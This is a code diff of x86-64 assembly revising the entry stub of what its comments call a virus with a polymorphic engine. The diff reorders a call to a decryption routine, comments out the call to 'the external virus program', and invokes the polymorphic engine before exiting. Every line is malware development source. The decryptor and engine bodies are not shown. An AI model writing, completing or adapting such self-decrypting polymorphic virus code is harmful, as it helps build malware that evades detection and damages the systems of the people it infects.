@@ -13,51 +13,33 @@ section .text
 align 16
 _start:             ; Global entry point
 
-	; ; save variables to stack for calling main later
-
-	;rbx never changes after decrypt function call, so store rsp there
-	;do this the first action to preserve integrity of rsp as the value of rsp will change every instruction parsed
-	mov rbx, rsp
-
-	; create space to save state in rsp
-	push rbp
-	mov  rbp, rsp
-	sub  rsp, 0x18
-
-	;save data initial program state
-	mov [rbp-0x18],	rdi 
-	mov [rbp-0x10],	rsi
-
-    call decrypt
-
-	; reload the initial program, state
-	mov rdi, [rbp-0x18]
-	mov rsi, [rbp-0x10]
-	mov rsp, rbx
 
 	; save initial program state
 	mov rbx, rsp 
 	mov r14, rdi
 	mov r15, rsi
 
+	call decrypt
 
-	; DO NOT TOUCH CALLING MAIN
-	xor rbp, rbp
-	pop rdi
-	mov rsi, rsp
-	lea rdx, [rsp+rdi+8*8]
-	push rdi
-	call main
-	
+	; ; reload the initial program, state
+	; mov rsp, rbx 
+	; mov rdi, r14
+	; mov rsi, r15
 
+	; ; call the external virus program
+	; xor rbp, rbp
+	; pop rdi
+	; mov rsi, rsp
+	; lea rdx, [rsp+rdi+8*8]
+	; push rdi
+	; call main
 
 	; reload the initial program, state
 	mov rsp, rbx 
 	mov rdi, r14
 	mov rsi, r15
 
-
-	; call polymorphic
+	; call the polymorphicengine
 	xor rbp, rbp
 	pop rdi
 	mov rsi, rsp
@@ -67,6 +49,7 @@ _start:             ; Global entry point
 	mov rdi, rax
 	mov eax, 1
 	int 80h
+
 
 
 decrypt:
